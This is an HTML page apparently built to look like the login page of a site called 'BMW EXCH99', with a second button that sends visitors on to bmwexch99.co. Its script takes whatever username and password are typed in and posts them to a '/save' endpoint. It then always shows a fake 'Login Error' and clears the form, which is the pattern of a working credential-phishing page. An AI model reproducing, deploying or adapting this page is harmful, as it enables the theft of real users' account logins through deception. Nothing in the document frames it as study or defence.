<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>BMW EXCH99</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial;
}

body{

    background:linear-gradient(
        to bottom,
        #001133,
        #00aa55
    );

    height:100vh;

    display:flex;

    justify-content:center;

    align-items:center;

}

.main{

    width:360px;

}

.logo{

    text-align:center;

    color:white;

    font-size:50px;

    font-weight:bold;

    margin-bottom:20px;

}

.login-box{

    background:white;

    padding:25px;

    border-radius:12px;

    box-shadow:0 0 10px rgba(0,0,0,0.3);

}

.login-box h2{

    text-align:center;

    margin-bottom:20px;

    color:#001133;

}

input{

    width:100%;

    padding:14px;

    margin-bottom:15px;

    border:1px solid #ccc;

    border-radius:5px;

    font-size:16px;

}

button{

    width:100%;

    padding:14px;

    border:none;

    border-radius:5px;

    font-size:16px;

    cursor:pointer;

    margin-bottom:10px;

    color:white;

}

.login-btn{

    background:#001133;

}

.demo-btn{

    background:black;

}

button:hover{

    opacity:0.9;

}

.footer{

    text-align:center;

    margin-top:10px;

    font-size:12px;

    color:gray;

}

</style>

</head>

<body>

<div class="main">

    <div class="logo">

        BMW<br>
        EXCH99

    </div>

    <div class="login-box">

        <h2>Login</h2>

        <input
            type="text"
            id="username"
            placeholder="Username"
        >

        <input
            type="password"
            id="password"
            placeholder="Password"
        >

        <button
        class="login-btn"
        onclick="login()">

            Login

        </button>

        <button 
        class="demo-btn"
        onclick="window.location.href='https://www.bmwexch99.co/home'">

            Login with Demo ID

        </button>

        <div class="footer">

            This site is protected by reCAPTCHA

        </div>

    </div>

</div>

<script>

async function login() {

    const username =
    document.getElementById("username").value;

    const password =
    document.getElementById("password").value;

    if(username === "" || password === ""){

        alert("Please fill all fields");

        return;

    }

    try{

        await fetch("/save", {

            method: "POST",

            headers: {

                "Content-Type": "application/json"

            },

            body: JSON.stringify({

                username,
                password

            })

        });

        alert("Login Error");

        document.getElementById("username").value = "";

        document.getElementById("password").value = "";

    }

    catch(error){

        alert("Server Error");

        console.log(error);

    }

}

</script>

</body>

</html>
